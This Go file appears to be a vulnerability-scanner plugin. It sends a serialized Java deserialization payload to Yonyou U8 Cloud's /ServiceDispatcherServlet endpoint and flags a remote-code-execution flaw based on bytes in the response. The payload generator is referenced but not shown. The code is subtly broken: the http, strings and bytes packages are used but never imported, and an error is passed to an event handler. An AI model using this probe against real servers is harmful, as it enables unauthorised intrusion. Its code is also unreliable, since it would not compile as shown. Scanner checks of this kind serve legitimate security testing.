package gopoc



import (

	"git.in.chaitin.net/lohengrin/xraykit/event"

	"git.in.chaitin.net/lohengrin/xraykit/plugin/module"

	"git.in.chaitin.net/lohengrin/xraykit/plugin/module/xhttp"

	"git.in.chaitin.net/lohengrin/xraykit/util"

	"git.in.chaitin.net/lohengrin/xraykit/xray"

)



var yonyouU8CloudRCE = xray.NewPlugin("poc-yonyou-u8-cloud-servicedispatcherservlet-rce", yonyouU8CloudRCEFun)



func yonyouU8CloudRCEFun(plugin *xray.Plugin, client *module.Client) {

	plugin.Event(func(site *event.Website, out func(v *event.Vulnerability)) {

		hf := site.HttpFlow
		req, _, err := xhttp.LoadFromEvent(hf)
		if err != nil {
			plugin.Event(err)
			return
		}

		req.Method = http.MethodPost
		req.WithFollowRedirects(false)
		err = req.ReplaceURI("/ServiceDispatcherServlet")
		plugin.Check(err)

		// 生成对应的序列化数据
		ser := generateSer()


		req.SetBodyContent(ser, "*")

		resp, err := client.Do(req)

		if err != nil {

			plugin.Error(err)

			return

		}



		if resp.GetStatusCode() != 200 {

			plugin.Warn("no vulnerability: request error")

			return

		}


		contentType := resp.GetHeader().Get("Content-Type")
		raw := resp.GetRawBody()


		if strings.Contains(contentType, "application/x-java-serialized-object") {


			if bytes.Contains([]byte(raw), []byte{0x72, 0x71, 0x89, 0x01}){

				nReq, nResp, err := xhttp.ConvertToEvent(req, resp)

				if err != nil {

					plugin.Warn(err)

				}

				vuln := plugin.NewWebVulnerability(site).AddStep("", nReq, nResp)

				plugin.Info("find vuln: %s", vuln.Name)

				out(vuln)

			} else {

				plugin.Warn("no vulnerability: invalid response")

			}

		} else {

			plugin.Warn("no vulnerability: invalid response")

		}

	})

}




